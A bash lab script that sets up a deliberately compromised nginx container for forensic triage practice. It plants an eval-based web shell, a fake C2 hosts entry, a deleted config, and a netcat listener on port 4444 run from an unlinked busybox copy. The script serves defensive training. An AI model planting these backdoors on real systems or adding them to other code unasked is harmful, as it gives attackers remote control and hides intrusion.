#!/usr/bin/env bash
# ==============================================================================
# Script: simulate_compromise.sh
# Purpose: Deploys a realistic test container scenario
#          simulating 4 attacker techniques:
#          1. Web shell drop (ADDED executable)
#          2. Hostname/DNS tampering (MODIFIED config)
#          3. Log/config deletion (DELETED whiteout in Overlay2)
#          4. Fileless in-memory miner/reverse shell (/proc PID exe deleted + socket)
# ==============================================================================

set -euo pipefail

CONTAINER_NAME="victim-web"
IMAGE_NAME="nginx:alpine"
C2_IP="198.51.100.44"
C2_PORT="4444"

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${BLUE}================================================================${NC}"
echo -e "${BLUE}  [LAB SETUP] Simulating Container Compromise (Attack Scenario) ${NC}"
echo -e "${BLUE}================================================================${NC}"

# Check Docker availability
if ! command -v docker &>/dev/null; then
    echo -e "${RED}[-] Docker is not installed or not in PATH.${NC}"
    exit 1
fi

# Cleanup existing test container if running
if docker ps -a --format '{{.Names}}' | grep -Eq "^${CONTAINER_NAME}\$"; then
    echo -e "${YELLOW}[*] Removing existing container '${CONTAINER_NAME}'...${NC}"
    docker rm -f "${CONTAINER_NAME}" >/dev/null 2>&1 || sudo docker rm -f "${CONTAINER_NAME}" >/dev/null 2>&1
fi

echo -e "${BLUE}[*] Starting target container (${IMAGE_NAME})...${NC}"
docker run -d --name "${CONTAINER_NAME}" -p 8080:80 "${IMAGE_NAME}" >/dev/null

sleep 2

CONTAINER_ID=$(docker inspect -f '{{.Id}}' "${CONTAINER_NAME}")
HOST_PID=$(docker inspect -f '{{.State.Pid}}' "${CONTAINER_NAME}")

echo -e "${GREEN}[+] Target container running!${NC}"
echo -e "    Container ID: ${YELLOW}${CONTAINER_ID}${NC}"
echo -e "    Host PID:     ${YELLOW}${HOST_PID}${NC}"
echo ""
echo -e "${BLUE}[*] Simulating attacker actions inside container...${NC}"

# 1. Drop backdoor / web shell (Added file)
echo -e "  [1/4] Dropping web shell in document root..."
docker exec "${CONTAINER_NAME}" sh -c 'cat << "EOF" > /usr/share/nginx/html/shell.sh
#!/bin/sh
# Attacker Web Shell / Remote Control
cmd="$1"
eval "$cmd"
EOF
chmod +x /usr/share/nginx/html/shell.sh'
echo -e "        ${GREEN}✓ /usr/share/nginx/html/shell.sh created (executable)${NC}"

# 2. Modify /etc/hosts (Modified file)
echo -e "  [2/4] Modifying /etc/hosts for C2 domain resolution..."
docker exec "${CONTAINER_NAME}" sh -c "echo '${C2_IP} c2.evil-attacker.local' >> /etc/hosts"
echo -e "        ${GREEN}✓ Injected '${C2_IP} c2.evil-attacker.local' into /etc/hosts${NC}"

# 3. Delete default configuration to cover tracks (Deleted file -> Whiteout)
echo -e "  [3/4] Deleting default configuration to simulate anti-forensics..."
docker exec "${CONTAINER_NAME}" sh -c "rm -f /etc/nginx/conf.d/default.conf"
echo -e "        ${GREEN}✓ /etc/nginx/conf.d/default.conf deleted (Overlay2 whiteout created)${NC}"

# 4. Fileless memory persistence: run background binary & unlink file
echo -e "  [4/4] Launching fileless memory malware & establishing C2 socket..."
# Copy busybox with 'busybox' prefix so it executes applets & stays alive in RAM
docker exec "${CONTAINER_NAME}" cp /bin/busybox /tmp/busybox_miner
# Launch fileless miner process that also listens on backdoor port 4444
docker exec -d "${CONTAINER_NAME}" /tmp/busybox_miner nc -l -p "${C2_PORT}"
# Launch second fileless worker simulating C2 beacon / cryptominer payload
docker exec -d "${CONTAINER_NAME}" /tmp/busybox_miner sleep 999999 --pool="stratum+tcp://${C2_IP}:${C2_PORT}" 2>/dev/null || \
docker exec -d "${CONTAINER_NAME}" /tmp/busybox_miner sleep 999999

sleep 1
# Unlink binary from filesystem while both processes are still executing in RAM!
docker exec "${CONTAINER_NAME}" rm -f /tmp/busybox_miner

echo -e "        ${GREEN}✓ Process launched and binary /tmp/busybox_miner unlinked from disk!${NC}"
echo -e "        ${GREEN}✓ Process now running purely in memory: /proc/[PID]/exe points to (deleted)${NC}"

echo ""
echo -e "${GREEN}================================================================${NC}"
echo -e "${GREEN}  [SUCCESS] Lab is ready for Live Forensics Triage!             ${NC}"
echo -e "${GREEN}  Container: ${CONTAINER_NAME} (${CONTAINER_ID:0:12})           ${NC}"
echo -e "${GREEN}  Host PID:  ${HOST_PID}                                        ${NC}"
echo -e "${GREEN}================================================================${NC}"
echo -e "Next step: Run the forensic triage script:"
echo -e "  ${YELLOW}sudo ./live_forensics_triage.sh ${CONTAINER_NAME}${NC}"
